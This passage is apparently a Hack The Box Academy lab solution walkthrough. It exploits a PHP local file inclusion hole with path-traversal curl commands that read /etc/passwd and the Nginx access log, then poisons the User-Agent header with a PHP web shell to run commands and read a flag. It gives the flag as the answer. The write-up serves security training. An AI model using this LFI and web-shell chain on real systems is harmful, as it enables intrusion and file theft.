└──╼ [★]$ echo 'PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIiA+CjxoZWFkPgogIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICA8dGl0bGU+SW5sYW5lRnJlaWdodDwvdGl0bGU+CiAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSIuL3N0eWxlLmNzcyI+Cgo8L2hlYWQ+Cjxib2R5PgoKCjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4gICAgCiAgICB3aW5kb3cuaGlzdG9yeS5mb3J3YXJkKCk7CiAgICBmdW5jdGlvbiBwcmV2ZW50KCkKICAgIHsKICAgICB3aW5kb3cuaGlzdG9yeS5mb3J3YXJkKCk7IAogICAgfQogICAgPC9zY3JpcHQ+CgkKPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgaHJlZj0iYy5jc3MiIC8+CgoKCjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+CmJvZHkgewoJcGFkZGluZy10b3A6IDYwcHg7CglwYWRkaW5nLWJvdHRvbTogNDBweDsKfQoKLnNpZGViYXItbmF2IHsKICBwYWRkaW5nOiA5cHggMDsKICBtYXJnaW4tdG9wOiAzMHB4Owp9Ci5tYWluUGFnZXsKCWhlaWdodDogMTAwJQp9CgpAbWVkaWEgKCBtYXgtd2lkdGggOiA5ODBweCkgewoJLyogRW5hYmxlIHVzZSBvZiBmbG9hdGVkIG5hdmJhciB0ZXh0ICovCgkubmF2YmFyLXRleHQucHVsbC1yaWdodCB7CgkJZmxvYXQ6IG5vbmU7CgkJcGFkZGluZy1sZWZ0OiA1cHg7CgkJcGFkZGluZy1yaWdodDogNXB4OwoJfQp9CgouZGlzcGxheSB7CiAgd2lkdGg6IDcwJTsKICBoZWlnaHQ6IDQwMHB4OwogIHBhZGRpbmctYm90dG9tOiAyNTBweDsKICBib3JkZXI6IDFweCBzb2xpZCBibGFjazsgCiAgbWFyZ2luLWxlZnQ6IDI1MHB4OwogIG1hcmdpbi10b3A6IDMwcHg7CiAgb3ZlcmZsb3cteTogc2Nyb2xsOwp9Cgo8L3N0eWxlPgoKPHRpdGxlPklubGFuZUZyZWlnaHQ8L3RpdGxlPgo8L2hlYWQ+Cgo8Ym9keSBvbmxvYWQ9InByZXZlbnQoKTsiICBvbnVubG9hZD0iIj4KCTxkaXYgY2xhc3M9Im5hdmJhciBuYXZiYXItaW52ZXJzZSBuYXZiYXItZml4ZWQtdG9wIj4KCQk8ZGl2IGNsYXNzPSJuYXZiYXItaW5uZXIiPgoJCQk8ZGl2IGNsYXNzPSJjb250YWluZXItZmx1aWQiPgoJCQkJPGEgY2xhc3M9ImJyYW5kIj5BZG1pbiBQYW5lbDwvYT4KCQkJCTxkaXYgY2xhc3M9Im5hdi1jb2xsYXBzZSBjb2xsYXBzZSI+CgkJCTwvZGl2PgoJCTwvZGl2PgoJPC9kaXY+CgoJPGRpdiBjbGFzcz0iY29udGFpbmVyLWZsdWlkIj4KCQk8ZGl2IGNsYXNzPSJyb3ctZmx1aWQgbWFpblBhZ2UiPgoJCQk8ZGl2IGNsYXNzPSJ3cmFwcGVyIj4KCQkJCTxkaXYgY2xhc3M9IndlbGwgc2lkZWJhci1uYXYiPgoJCQkJCTx1bCBpZD0ic2lkZUJhciIgY2xhc3M9Im5hdiBuYXYtbGlzdCI+CgkJCQkJCTxsaSBjbGFzcz0ibmF2LWhlYWRlciI+RGF0YSBMb2dzPC9saT4KCQkJCQkJCTxsaSBpZD0ibXRtaS1tZW51IiBuYW1lPSJtb250aGluZm8iPjxhIGhyZWY9ImluZGV4LnBocD9sb2c9Y2hhdC5sb2ciPjxzcGFuPkNoYXQgTG9nPC9zcGFuPjwvYT48L2xpPgoJCQkJCQkJPGxpIGlkPSJtdG1pLW1lbnUiIG5hbWU9Im10bWkiPjxhIGhyZWY9ImluZGV4LnBocD9sb2c9aHR0cC5sb2ciPjxzcGFuPlNlcnZpY2UgTG9nPC9zcGFuPjwvYT48L2xpPgoJCQkJCQk8bGkgY2xhc3M9Im5hdi1oZWFkZXIiPlBlcmZvcm1hbmNlIFZpZXc8L2xpPgoJCQkJCQkJPGxpIGlkPSJtb250aGluZm8tbWVudSIgbmFtZT0ibW9udGhpbmZvIj48YSBocmVmPSJpbmRleC5waHA/bG9nPXN5c3RlbS5sb2ciPjxzcGFuPlN5c3RlbSBMb2c8L3NwYW4+PC9hPjwvbGk+CgkJCQkJPC91bD4KCQkJCTwvZGl2PgoJCQkJPCEtLS8ud2VsbCAtLT4KCQkJPC9kaXY+CgkJPC9kaXY+Cgk8L2Rpdj4KCTxkaXYgY2xhc3M9ImRpc3BsYXkiPgoJPD9waHAKCWlmKGlzc2V0KCRfR0VUWydsb2cnXSkpIHsKCSAgJGxvZyA9ICJsb2dzLyIgLiAkX0dFVFsnbG9nJ107CgkgIGVjaG8gIjxwcmU+IjsKCSAgaW5jbHVkZSAkbG9nOwoJICBlY2hvICI8L3ByZT4iOwoJfQoJPz4KCTwvZGl2PgoJCgk8c2NyaXB0IHNyYz0ianMvanF1ZXJ5LmpzIj48L3NjcmlwdD4KCTxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9ImpzL2Jvb3RzdHJhcC5qcyI+PC9zY3JpcHQ+CgkKPC9ib2R5Pgo8L2h0bWw+CjwhLS0gcGFydGlhbCAtLT4KICAKPC9ib2R5Pgo8L2h0bWw+Cg==' | base64 -d

<!DOCTYPE html>
<html lang="en" >

<SNIP>

	<?php
	if(isset($_GET['log'])) {
	  $log = "logs/" . $_GET['log'];
	  echo "<pre>";
	  include $log;
	  echo "</pre>";
	}
	?>

<SNIP>
```

From within the `ilf_admin/index` page source, students will notice that there exists a basic LFI vulnerability:

Code: php

```php
<?php
	if(isset($_GET['log'])) {
	  $log = "logs/" . $_GET['log'];
	  echo "<pre>";
	  include $log;
	  echo "</pre>";
	}
?>
```

Therefore, students need to weaponize this vulnerability to attempt reading files on the backend server, such as `/etc/passwd`:

Code: shell

```shell
curl -s http://STMIP:STMPO/ilf_admin/index.php?log=../../../../../../../etc/passwd | tr "\n" "|" | grep -o '<pre>.*</pre>'
```

```
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-0acwh0hrp7]─[~]
└──╼ [★]$ curl -s http://138.68.166.182:31470/ilf_admin/index.php?log=../../../../../../../etc/passwd | tr "\n" "|" | grep -o '<pre>.*</pre>'

<pre>root:x:0:0:root:/root:/bin/ash|bin:x:1:1:bin:/bin:/sbin/nologin|daemon:x:2:2:daemon:/sbin:/sbin/nologin|adm:x:3:4:adm:/var/adm:/sbin/nologin|lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin|sync:x:5:0:sync:/sbin:/bin/sync|shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown|halt:x:7:0:halt:/sbin:/sbin/halt|mail:x:8:12:mail:/var/mail:/sbin/nologin|news:x:9:13:news:/usr/lib/news:/sbin/nologin|uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin|operator:x:11:0:operator:/root:/sbin/nologin|man:x:13:15:man:/usr/man:/sbin/nologin|postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin|cron:x:16:16:cron:/var/spool/cron:/sbin/nologin|ftp:x:21:21::/var/lib/ftp:/sbin/nologin|sshd:x:22:22:sshd:/dev/null:/sbin/nologin|at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin|squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin|xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin|games:x:35:35:games:/usr/games:/sbin/nologin|cyrus:x:85:12::/usr/cyrus:/sbin/nologin|vpopmail:x:89:89::/var/vpopmail:/sbin/nologin|ntp:x:123:123:NTP:/var/empty:/sbin/nologin|smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin|guest:x:405:100:guest:/dev/null:/sbin/nologin|nobody:x:65534:65534:nobody:/:/sbin/nologin|nginx:x:100:101:nginx:/var/lib/nginx:/sbin/nologin|</pre>
```

Now that students have confirmed this LFI vulnerability exists and can be weaponized, they need to determine whether the web server running on the backend is `Apache` or `Nginx`. When including the `access.log` file of `Nginx` through the LFI vulnerability, its output is returned:

Code: shell

```shell
curl -s http://STMIP:STMPO/ilf_admin/index.php?log=../../../../../../../var/log/nginx/access.log | tr "\n" "|" | grep -o '<pre>.*</pre>'
```

```
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-gap9qocwkb]─[~]
└──╼ [★]$ curl -s http://159.65.63.151:32743/ilf_admin/index.php?log=../../../../../../../var/log/nginx/access.log | tr "\n" "|" | grep -o '<pre>.*</pre>'

<pre>159.65.63.151 - - [06/Nov/2022:09:16:21 +0000] "GET /ilf_admin/index.php?log=../../../../../../../var/log/apache2/access.log HTTP/1.1" 200 2058 "-" "curl/7.74.0"|159.65.63.151 - - [06/Nov/2022:09:17:38 +0000] "GET /ilf_admin/index.php?log=../../../../../../../var/log/apache2/access.log HTTP/1.1" 504 494 "-" "curl/7.74.0"|</pre>
```

Thus, `Nginx` is running on the backend server. Students now need to poison the `User-Agent` header. To do so, students need to use an intercepting proxy such as `Burp Suite`, or, the Networking tab of the Web Developer Tools, to capture the request that includes the `Nginx` log file through the LFI vulnerability and poison the `User-Agent` header to be a PHP web shell. Using `Firefox`, students need to navigate to `http://STMIP:STMPO/ilf_admin/index.php?log=../../../../../../../var/log/nginx/access.log`, open the Network tab of the Web Developer Tools, then refresh the page, to notice that there is a `GET` request to `index.php?`, thus they need to click on it, and click on `Resend` -> `Edit and Resend`:

![[HTB Solutions/CPTS/z. images/c8d7c1c57ce776bb49e317845261a6bc_MD5.jpg]]

Subsequently, students need to poison the `User-Agent` header to be a PHP web shell then send the edited request:

```php
<?php system($_GET['cmd']); ?>
```

![[HTB Solutions/CPTS/z. images/0712ea1edcdf21f430c209c06ab9e8ae_MD5.jpg]]

Students now will be able to execute commands on the backend server utilizing the `cmd` URL parameter. Therefore, students need to list the files that are in the root directory `/`:

```
http://STMIP:STMPO/ilf_admin/index.php?log=../../../../../../../var/log/nginx/access.log&cmd=ls%20/
```

![[HTB Solutions/CPTS/z. images/5817e1492551b825fe622b9abd6f3c07_MD5.jpg]]

Students will find the flag file with the name `flag_dacc60f2348d.txt`, therefore, students at last need to print its contents out, to attain the flag `a9a892dbc9faf9a014f58e007721835e`:

```
http://STMIP:STMPO/ilf_admin/index.php?log=../../../../../../../var/log/nginx/access.log&cmd=cat%20/flag_dacc60f2348d.txt
```

![[HTB Solutions/CPTS/z. images/367370266aef9ddb207b04bd87e7882e_MD5.jpg]]

Answer: `a9a892dbc9faf9a014f58e007721835e`